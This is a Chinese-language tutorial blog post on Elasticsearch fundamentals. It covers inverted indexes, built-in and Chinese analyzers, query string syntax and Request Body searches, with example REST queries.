全文检索</h2><p>在我们生活中的数据总体是分为两种的：结构化数据和非结构化数据。</p><ul><li>结构化数据：指具有固定格式或有限长度的数据，如数据库，元数据等；</li><li>非结构化数据：指不定长或无固定格式的数据，如邮件，word文档等磁盘上的文件。</li></ul><p>如果是结构化数据，用数据库中的搜索很容易实现，因为数据库中的数据存储是有规律的，有行有列而且数据格式、数据长度都是固定的。</p><h3 id="非结构化数据查询有两种办法："><a href="#非结构化数据查询有两种办法：" class="headerlink" title="非结构化数据查询有两种办法："></a><strong>非结构化数据查询有两种办法：</strong></h3><ul><li><p><strong>顺序扫描法</strong>(Serial Scanning)</p></li><li><p>所谓顺序扫描，比如要找内容包含某一个字符串的文件，就是一个文档一个文档的看，对于每一个文档，从头看到尾，如果此文档包含此字符串，则此文档为我们要找的文件，接着看下一个文件，直到扫描完所有的文件。</p></li><li><p><strong>全文检索</strong>(Full-text Search)</p></li><li><p>将非结构化数据中的一部分信息提取出来，重新组织，使其变得有一定结构，然后对此有一定结构的数据进行搜索，从而达到搜索相对较快的目的。这部分从非结构化数据中提取出的然后重新组织的信息，我们称之<strong>索引</strong>。</p><ul><li>例如：字典，字典的拼音表和部首检字表就相当于字典的索引，对每一个字的解释是非结构化的，如果字典没有音节表和部首检字表，在茫茫辞海中找一个字只能顺序扫描。然而字的某些信息可以提取出来进行结构化处理，比如读音，就比较结构化，分声母和韵母，于是将读音拿出来按一定的顺序排列，每一项读音都指向此字的详细解释的页数。我们搜索时按结构化的拼音搜到读音，然后按其指向的页数，便可找到我们的非结构化数据——也即对字的解释。</li></ul></li></ul><blockquote><p><strong>这种先建立索引，再对索引进行搜索的过程就叫全文检索(Full-text Search)。</strong></p></blockquote><h2 id="ES-核心-倒排索引"><a href="#ES-核心-倒排索引" class="headerlink" title="ES 核心 - 倒排索引"></a>ES 核心 - 倒排索引</h2><h3 id="目录-正排索引"><a href="#目录-正排索引" class="headerlink" title="目录 - 正排索引"></a><strong>目录 - 正排索引</strong></h3><p><img src="/images/big-data/es-03/9.jpg" alt="9"></p><h3 id="索引页-倒排索引"><a href="#索引页-倒排索引" class="headerlink" title="索引页 - 倒排索引"></a><strong>索引页 - 倒排索引</strong></h3><p><img src="/images/big-data/es-03/10.jpg" alt="10"></p><h3 id="图书和搜索引擎的类比"><a href="#图书和搜索引擎的类比" class="headerlink" title="图书和搜索引擎的类比"></a><strong>图书和搜索引擎的类比</strong></h3><ul><li>图书<ul><li>正排索引 - 目录页</li><li>倒排索引 - 索引页</li></ul></li><li>搜索引擎<ul><li>正排索引 - 文档ID 到文档内容和单词的关联</li><li>倒排索引 - 单词到文档 ID 的关系</li></ul></li></ul><p><img src="/images/big-data/es-03/11.jpg" alt="11"></p><h3 id="ES-倒排索引的核心组成"><a href="#ES-倒排索引的核心组成" class="headerlink" title="ES 倒排索引的核心组成"></a><strong>ES 倒排索引的核心组成</strong></h3><ul><li>倒排索引包含两个部分<ul><li>单词词典（Term Dictionary），记录所有文档的单词，记录单词到倒排列表的关联关系<ul><li>单词词典一般比较大，可以通过B＋树或哈希拉链法实现，以满足高性能的插入与查询</li></ul></li><li>倒排列表（Posting List）- 记录了单词对应的文档结合，由倒排索引项组成<ul><li>倒排索引项（Posting）<ul><li>文档 ID</li><li>词频 TF - 该单词在文档中出现的次数，用于相关性评分</li><li>位置（Position）- 单词在文档中分词的位置。用于语句搜索（phrase query）</li><li>偏移（Offset）- 记录单词的开始结束位置，实现高亮显示</li></ul></li></ul></li></ul></li></ul><p><img src="/images/big-data/es-03/12.jpg" alt="一个ES例子"></p><h3 id="Elasticsearch-的倒排索引"><a href="#Elasticsearch-的倒排索引" class="headerlink" title="Elasticsearch 的倒排索引"></a><strong>Elasticsearch 的倒排索引</strong></h3><ul><li>Elasticsearch 的 JSON 文档中的每个字段，都有自己的倒排索引</li><li>可以指定对某些字段不做索引<ul><li>优点：节省储存空间</li><li>缺点：字段无法被搜索</li></ul></li></ul><h2 id="ES-核心-通过-Analyzer-进行分词"><a href="#ES-核心-通过-Analyzer-进行分词" class="headerlink" title="ES 核心 - 通过 Analyzer 进行分词"></a>ES 核心 - 通过 Analyzer 进行分词</h2><ul><li>Analysis  - 文本分析是把全文本转换一系列单词（term / token）的过程，也叫分词</li><li>Analysis 是通过 Analyze 实现<ul><li>可以使用 ES 内置的分析器或者按需定制化分析器</li></ul></li><li>除了在数据写入时转换词条，匹配 Query 语句时候也需要用相同的分析器对查询语句进行分析</li></ul><h3 id="Analyze-的组成"><a href="#Analyze-的组成" class="headerlink" title="Analyze 的组成"></a><strong>Analyze 的组成</strong></h3><ul><li><p>除了在数据写入时转换词条，匹配 Query 语句时候也需要用相同的分析器对查询语句进行分析</p><ul><li>Character Filters（针对原始文本处理，例如去除html）</li><li>Tokenizer（按照规则切分为单词）</li><li>Token Fiter（将切分的的单词进行加工，小写，删除 stopwords，增加同义词）</li></ul><p><img src="/images/big-data/es-03/13.jpg" alt="13"></p></li></ul><h3 id="Elasticsearch-的内置分词器"><a href="#Elasticsearch-的内置分词器" class="headerlink" title="Elasticsearch 的内置分词器"></a><strong>Elasticsearch 的内置分词器</strong></h3><ul><li>Standard Analyzer - 默认分词器，按词切分，小写处理；</li><li>Simple Analyzer - 按照非字母切分（符号被过滤），小写处理；</li><li>Stop Analyzer - 小写处理，停用词过滤（the，a，is）；</li><li>Whitespace Analyzer - 按照空格切分，不转小写；</li><li>Keyword Analyzer - 不分词，直接将输入当作输出；</li><li>Patter Analyzer - 正则表达式，默认\W+（非字符分隔）；</li><li>Language - 提供了30多种常见语言的分词器；</li><li>Customer Analyzer 自定义分词器。</li></ul><h3 id="使用-analyzer-API"><a href="#使用-analyzer-API" class="headerlink" title="使用 _analyzer API"></a>使用 _analyzer API</h3><p>直接指定 Analyzer 进行测试</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET _analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"analyzer"</span>: <span class="string">"standard"</span>,</span><br><span class="line">  <span class="attr">"text"</span> : <span class="string">"Mastering Elasticsearch, elasticsearch in Action"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>指定索引的字段进行测试</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST books/_analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"field"</span>: <span class="string">"title"</span>,</span><br><span class="line">  <span class="attr">"text"</span>: <span class="string">"Mastering Elasticesearch"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自定义分词进行测试</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /_analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"tokenizer"</span>: <span class="string">"standard"</span>, </span><br><span class="line">  <span class="attr">"filter"</span>: [<span class="string">"lowercase"</span>],</span><br><span class="line">  <span class="attr">"text"</span>: <span class="string">"Mastering Elasticesearch"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Standard-Analyzer"><a href="#Standard-Analyzer" class="headerlink" title="Standard Analyzer"></a>Standard Analyzer</h3><img src="/images/big-data/es-03/14.jpg" align="right" style="zoom:50%;" /><ul><li>默认的分词器</li><li>按词切分</li><li>小写处理</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET _analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"analyzer"</span>: <span class="string">"standard"</span>,</span><br><span class="line">  <span class="attr">"text"</span>: <span class="string">"2 running Quick brown-foxes leap over lazy dogs in the summer evening."</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><!-- ![14][14] --><h3 id="Simple-Analyzer"><a href="#Simple-Analyzer" class="headerlink" title="Simple Analyzer"></a>Simple Analyzer</h3><ul><li>按照非字母切分，非字母的都被去除</li><li>小写处理</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// simple 去除非字母的 ：2 - xi</span></span><br><span class="line">GET _analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"analyzer"</span>: <span class="string">"simple"</span>,</span><br><span class="line">  <span class="attr">"text"</span>: <span class="string">"2 running Quick brown-foxes leap over lazy dogs in the summer evening."</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/big-data/es-03/15.jpg" alt="15"></p><h3 id="Whitespace-Analyzer"><a href="#Whitespace-Analyzer" class="headerlink" title="Whitespace Analyzer"></a>Whitespace Analyzer</h3><img src="/images/big-data/es-03/16.jpg" align="right" style="zoom:50%;" /><ul><li>按照空格切分</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET _analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"analyzer"</span>: <span class="string">"whitespace"</span>,</span><br><span class="line">  <span class="attr">"text"</span>: <span class="string">"2 running Quick brown-foxes leap over lazy dogs in the summer evening."</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><!-- ![16][16] --><h3 id="Stop-Analyzer"><a href="#Stop-Analyzer" class="headerlink" title="Stop Analyzer"></a>Stop Analyzer</h3><img src="/images/big-data/es-03/17.jpg" align="right" style="zoom:50%;" /><ul><li>相比 Simple Analyzer</li><li>多了 stop filter<ul><li>后把 the, a, is, in 等修饰性词语去除</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET _analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"analyzer"</span>: <span class="string">"stop"</span>,</span><br><span class="line">  <span class="attr">"text"</span>: <span class="string">"2 running Quick brown-foxes leap over lazy dogs in the summer evening."</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><!-- ![17][17] --><h3 id="Keyword-Analyzer"><a href="#Keyword-Analyzer" class="headerlink" title="Keyword Analyzer"></a>Keyword Analyzer</h3><img src="/images/big-data/es-03/18.jpg" align="right" style="zoom:50%;" /><ul><li>不分词，直接将输入当作一个 term 输出</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET _analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"analyzer"</span>: <span class="string">"keyword"</span>,</span><br><span class="line">  <span class="attr">"text"</span>: <span class="string">"2 running Quick brown-foxes leap over lazy dogs in the summer evening."</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><!-- ![18][18] --><h3 id="Pattern-Analyzer"><a href="#Pattern-Analyzer" class="headerlink" title="Pattern Analyzer"></a>Pattern Analyzer</h3><img src="/images/big-data/es-03/19.jpg" align="right" style="zoom:50%;" /><ul><li>通过正则表达进行分词</li><li>默认是 \W+，非字符的符号进行分隔</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET _analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"analyzer"</span>: <span class="string">"pattern"</span>,</span><br><span class="line">  <span class="attr">"text"</span>: <span class="string">"2 running Quick brown-foxes leap over lazy dogs in the summer evening."</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><!-- ![19][19] --><h3 id="Language-Analyzer"><a href="#Language-Analyzer" class="headerlink" title="Language Analyzer"></a>Language Analyzer</h3><ul><li>各国语言分词</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET _analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"analyzer"</span>: <span class="string">"english"</span>,</span><br><span class="line">  <span class="attr">"text"</span>: <span class="string">"2 running Quick brown-foxes leap over lazy dogs in the summer evening."</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="中文分词的难点"><a href="#中文分词的难点" class="headerlink" title="中文分词的难点"></a>中文分词的难点</h3><ul><li>中文句子，切分成一个一个次（不是一个个字）</li><li>英文中，单词有自然的空格作为分隔</li><li>一句中文，在不同的上下文，有不同的理解<ul><li>这个苹果，不大好吃 / 这个苹果，不大，好吃！</li></ul></li><li>一些例子<ul><li>他说的确实在理 / 这事的确定不下来</li></ul></li></ul><h3 id="ICU-Analyzer"><a href="#ICU-Analyzer" class="headerlink" title="ICU Analyzer"></a>ICU Analyzer</h3><img src="/images/big-data/es-03/20.jpg" align="right" style="zoom:50%;" /><ul><li>需要安装 plugin<ul><li>Elasticsearch-plugin install analysis</li></ul></li><li>提过了 Unicode 的支持，更好的支持亚洲语言！</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST _analyze</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"analyzer"</span>: <span class="string">"icu_analyzer"</span>,</span><br><span class="line">  <span class="attr">"text"</span>: <span class="string">"他说的确实在理"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><!-- ![20][20] --><h3 id="更多的中文分词器"><a href="#更多的中文分词器" class="headerlink" title="更多的中文分词器"></a>更多的中文分词器</h3><ul><li>IK<ul><li>支持自定义词库，支持热更新分词字典</li><li><a href="https://github.com/medcl/elasticsearch-analysis-ik" target="_blank" rel="noopener">https://github.com/medcl/elasticsearch-analysis-ik</a></li></ul></li><li>HanLP 分词器<ul><li>开源，社区活跃，原始模型用的训练语料是人民日报的语料，当然如果你有足够的语料也可以自己训练。</li><li><a href="https://www.hanlp.com" target="_blank" rel="noopener">https://www.hanlp.com</a></li></ul></li></ul><h2 id="ES-核心-Search-API"><a href="#ES-核心-Search-API" class="headerlink" title="ES 核心 - Search API"></a>ES 核心 - Search API</h2><ul><li>URL Search<ul><li>在 URL 中使用查询参数</li></ul></li><li>Request Body Search<ul><li>使用 Elasticsearch 提供的，基于 JSON 格式的格式更加完备的 Query Dpmain Specific Language (DSL)</li></ul></li></ul><h3 id="指定查询的索引"><a href="#指定查询的索引" class="headerlink" title="指定查询的索引"></a>指定查询的索引</h3><table><thead><tr><th align="left">语法</th><th align="left">范围</th></tr></thead><tbody><tr><td align="left">/_search</td><td align="left">集群上所有的索引</td></tr><tr><td align="left">/index1/_search</td><td align="left">index1</td></tr><tr><td align="left">/index1,index2/_search</td><td align="left">index1 和 index2</td></tr><tr><td align="left">/index*/_search</td><td align="left">以 index 开头的索引</td></tr></tbody></table><h3 id="URI-查询"><a href="#URI-查询" class="headerlink" title="URI 查询"></a>URI 查询</h3><ul><li>使用 “q”, 指定查询字符串</li><li>“query string syntax”, KV 键值对</li></ul><p><img src="/images/big-data/es-03/21.jpg" alt="21"></p><h3 id="Request-Body"><a href="#Request-Body" class="headerlink" title="Request Body"></a>Request Body</h3><p><img src="/images/big-data/es-03/22.jpg" alt="22"></p><h3 id="搜索-Response"><a href="#搜索-Response" class="headerlink" title="搜索 Response"></a>搜索 Response</h3><p><img src="/images/big-data/es-03/23.jpg" alt="23"></p><h3 id="搜索的相关性-Relevance"><a href="#搜索的相关性-Relevance" class="headerlink" title="搜索的相关性 Relevance"></a>搜索的相关性 Relevance</h3><ul><li>搜索是用户和搜索引擎的对话</li><li>用户关心的是搜索结果的相关性</li><li>是否找到所有相关的内容<ul><li>有多少不相关的内容被返回了</li><li>文档的打分是否合理</li><li>结合业务需求，平衡结果排名</li></ul></li></ul><p><img src="/images/big-data/es-03/24.jpg" alt="24"></p><p><strong>WEB 搜索</strong></p><ul><li>Page Rank 算法<ul><li>不仅仅是内容</li><li>更重要的是内容的可信度</li></ul></li></ul><p><strong>电商搜索</strong></p><ul><li>搜索引擎扮演 - 销售的角色<ul><li>提高用户购物体验</li><li>提升网站的销售业绩</li><li>去库存</li></ul></li></ul><p><strong>衡量相关性</strong></p><ul><li>Information Retrieval<ul><li>Precision（查准率） - 尽可能返回较少的无关文档</li><li>Recall（查全率） - 尽量返回较多的相关文档</li><li>Ranking - 是否能够按照相关度进行排序</li></ul></li></ul><p><strong>Precision &amp; Recall</strong></p><ul><li>Prcision - True Positive / 全部返回的结果 （True and False Positives）</li><li>Recall - True Positive / 返回应该返回的结果 （True positives + false Negtives）</li><li>使用 Elasticsearch 的查询和相关参数改善搜索的 Precision 和 Recall</li></ul><p><img src="/images/big-data/es-03/25.jpg" alt="25"></p><h2 id="ES-核心-URI-Search-详解"><a href="#ES-核心-URI-Search-详解" class="headerlink" title="ES 核心 - URI Search 详解"></a>ES 核心 - URI Search 详解</h2><h3 id="通过-URI-query-实现搜索"><a href="#通过-URI-query-实现搜索" class="headerlink" title="通过 URI query 实现搜索"></a>通过 URI query 实现搜索</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /movies/_search?q=2012&amp;df=title&amp;sort=year:desc&amp;from=0&amp;size=10&amp;timeout=1s</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"profile"</span>: <span class="string">"true"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>q 指定查询语句，使用 Query String Syntax</li><li>df 默认字段，不指定时</li><li>Sort 排序 /from 和 size 用于分页</li><li>Profile 可以查看查询时如何被执行的</li></ul><h3 id="Query-String-Synctax"><a href="#Query-String-Synctax" class="headerlink" title="Query String Synctax"></a>Query String Synctax</h3><ul><li><p>指定字段 vs 泛查询</p><ul><li>q=title:2012 / q=2012</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只对title字段进行查询</span></span><br><span class="line">GET /movies/_search?q=2012&amp;df=title</span><br><span class="line"></span><br><span class="line"><span class="comment">//泛查询，正对_all ,所有字段</span></span><br><span class="line">GET /movies/_search?q=2012</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"profile"</span>: <span class="string">"true"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对自定字段进行查询  跟 df 等效</span></span><br><span class="line">GET /movies/_search?q=title:2012</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"profile"</span>: <span class="string">"true"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Term vs Phrase</p><ul><li>Beautiful Mind 等效于 Beautiful OR Mind</li><li>“Beautiful Mind”, 等效于 Beautiful AND Mind。Phrase 查询，还要求前后顺序保存一致</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用引号。Phrase</span></span><br><span class="line">GET /movies/_search?q=title:"Beautiful Mind"</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"profile"</span>: <span class="string">"true"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找美丽心灵，Mind为泛查询 </span></span><br><span class="line"><span class="comment">// 意思就是说 title 是Term  查询 "Beautiful" ，对所有字段查询"Mind"</span></span><br><span class="line">GET /movies/_search?q=title:Beautiful Mind</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"profile"</span>: <span class="string">"true"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>分组和引号</p><ul><li>title:(Beautiful AND Mind)</li><li>title=”Beautiful Mind”</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分组，Bool 查询 type：BooleanQuery</span></span><br><span class="line">GET /movies/_search?q=title:(Beautiful Mind)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"profile"</span>: <span class="string">"true"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>布尔操作</p><ul><li>AND / OR / NOT 或者 &amp;&amp; / || / !<ul><li>必须大写</li><li>title:(matrix NOT reloaded)</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// type：BooleanQuery</span></span><br><span class="line"><span class="comment">// title 里面必须包括Beautiful 跟 Mind</span></span><br><span class="line">GET /movies/_search?q=title:(Beautiful AND Mind)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"profile"</span>: <span class="string">"true"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// type：BooleanQuery </span></span><br><span class="line"><span class="comment">//必须包括Beautiful 但不包括 Mind</span></span><br><span class="line">GET /movies/_search?q=title:(Beautiful NOT Mind)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"profile"</span>: <span class="string">"true"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// type：BooleanQuery</span></span><br><span class="line"><span class="comment">//包括Beautiful必须有Mind</span></span><br><span class="line">GET /movies/_search?q=title:(Beautiful %2BMind)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"profile"</span>: <span class="string">"true"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>分组</p><ul><li>+ 表示 must</li><li>- 表示 must_not</li><li>title:(+matrix -reloaded)</li></ul></li><li><p>范围查询</p><ul><li>区间表示：[] 闭区间 ，{} 开区间<ul><li>year:{2019 TO 2018}</li><li>year:[* TO 2018]</li></ul></li></ul></li><li><p>算数符号</p><ul><li>year:&gt;2010</li><li>year(&gt;2010 &amp;&amp; &lt;=2018)</li><li>year:(+&gt;2010 +&lt;=2018)</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//范围查询，区间写法  / 数学写法</span></span><br><span class="line">GET /movies/_search?q=year:&gt;=1980</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"profile"</span>: <span class="string">"true"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>通配符查询（通配符查询效率低，占用内容大，不建议使用。特别是放在最前面）</p><ul><li>？代表 1 个字符，* 代表 0 或多个字符<ul><li>title:mi?d</li><li>title:be*</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通配符查询</span></span><br><span class="line">GET /movies/_search?q=ttile:b*</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"profile"</span>: <span class="string">"true"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>正则表达</p><ul><li>title:[bt]oy</li></ul></li><li><p>模糊匹配与近似查询</p><ul><li>title:befutifl~1</li><li>title:”lord rings” ~2</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//模糊匹配 </span></span><br><span class="line"><span class="comment">//用户输错,还能找到</span></span><br><span class="line">GET /movies/_search?q=ttile:beautifl~1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"profile"</span>: <span class="string">"true"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 近似度匹配 可查出     Lord of the Rings</span></span><br><span class="line">GET /movies/_search?q=ttile:"Lord Rings" ~2</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"profile"</span>: <span class="string">"true"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Request-Body-跟-Query-DSL-简介"><a href="#Request-Body-跟-Query-DSL-简介" class="headerlink" title="Request Body 跟 Query DSL 简介"></a>Request Body 跟 Query DSL 简介</h2><p>Request Body 可以实现很多高阶查询，建议多用 Request Body 做检索。</p><h3 id="Request-Body-Search"><a href="#Request-Body-Search" class="headerlink" title="Request Body Search"></a>Request Body Search</h3><ul><li>将查询语句通过 HTTP Request Body 发送给 Elasticsearch</li><li>Query DS</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /movies,404_idx/_search?ignore_unavailable=true</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"profile"</span>:<span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"query"</span>:&#123;</span><br><span class="line">    <span class="attr">"match_all"</span> : &#123;&#125;  <span class="comment">// 查询所有的文档</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><ul><li>From 从 0 开始 默认返回 10 个结果</li><li>获取靠后的翻页，成本较高</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /kibana_sample_data_ecommerce/_search</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"from"</span>:<span class="number">10</span>,</span><br><span class="line"><span class="attr">"size"</span>:<span class="number">20</span></span><br><span class="line"><span class="string">"query"</span>:&#123;</span><br><span class="line">   <span class="attr">"match_all"</span>:&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><ul><li>最好在 “数字型” 与 “日期型” 字段上排序</li><li>因为对于多值类型或分析过的字段排序，系统会选一个值，无法得知该值</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET kinaba_sample_data_ecommerce/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"sort"</span>:[&#123;<span class="attr">"order_date"</span>:<span class="string">"desc&#125;],</span></span><br><span class="line"><span class="string">  "</span>from<span class="string">":10,</span></span><br><span class="line"><span class="string">  "</span>size<span class="string">":5,</span></span><br><span class="line"><span class="string">   "</span>query<span class="string">":&#123;</span></span><br><span class="line"><span class="string">   "</span>match_all<span class="string">":&#123;&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="source-filtering"><a href="#source-filtering" class="headerlink" title="_source filtering"></a>_source filtering</h3><ul><li>如果_source 没有存储，那就只返回匹配的文档元数据</li><li>_source 支持使用通配符</li><li>_source[“name* “,”desc*”]</li></ul><p><img src="/images/big-data/es-03/26.jpg" alt="26"></p><h3 id="脚本字段"><a href="#脚本字段" class="headerlink" title="脚本字段"></a>脚本字段</h3><ul><li>能算出新的字段</li><li>用例：订单中有不同的汇率，需要结合汇率对订单价格进行排序</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 